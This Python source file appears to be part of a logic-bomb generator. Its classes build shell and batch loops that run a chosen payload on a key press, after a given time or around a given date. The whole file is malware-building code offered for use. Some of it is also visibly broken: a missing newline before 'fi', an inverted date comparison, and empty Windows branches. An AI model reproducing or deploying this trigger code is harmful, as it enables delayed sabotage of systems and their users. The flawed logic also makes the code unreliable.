class BaseTrigger(object):
    __trigger_name__ = "Base trigger class"
    __trigger_number__ = 0
    __takes_input__ = True
    __input_name__ = None

    def get_trigger(self, payload, triggering_entity, os):
        return None


class ExecuteOnKeyPress(BaseTrigger):
    __trigger_name__ = "Execute logic bomb on key press"
    __trigger_number__ = 1
    __takes_input__ = True
    __input_name__ = "key name"

    def get_trigger(self, payload, triggering_entity, os):
        logic = ""
        if os == "Linux" or os == "Darwin":
            logic = f'while true\ndo\nread -rsn1 input\nif [ "$input" = {triggering_entity} ]; then\n./{payload}fi' \
                    f'\ndone\n '
        elif os == "Windows":
            logic = f""

        return logic


class ExecuteOnCertainTime(BaseTrigger):
    __trigger_name__ = "Execute logic bomb on certain time (24 hour format)"
    __trigger_number__ = 2
    __takes_input__ = True
    __input_name__ = "time (HHMM)"

    def get_trigger(self, payload, triggering_entity, os):
        logic = ""
        if triggering_entity[0] == "0":
            triggering_entity = triggering_entity[1:]

        if os == "Linux" or os == "Darwin":
            logic = f"""while true\ndo\nif [ $(date +%k%M) -gt {triggering_entity} ]; then\n./{payload}\nfi\ndone\n"""
        elif os == "Windows":
            logic = f"@echo off\n:loop\nif %time:~0,2% gte {triggering_entity[:2]} ({payload}) else (echo)\ngoto :loop"

        return logic


class ExecuteOnCertainDate(BaseTrigger):
    __trigger_name__ = "Execute logic bomb on certain Date"
    __trigger_number__ = 3
    __takes_input__ = True
    __input_name__ = "date (YYYY-MM-DD)"

    def get_trigger(self, payload, triggering_entity, os):
        logic = ""
        if os == "Linux" or os == "Darwin":
            logic = f"hm=$(date '+%s')\nwhile true\ndo\nto_date=$(date -d {triggering_entity} '+%s')\nif " \
                    f"[ $to_date -gt $hm ];\nthen\n./{payload}\nfi\ndone\n "
        elif os == "Windows":
            logic = f""
        return logic
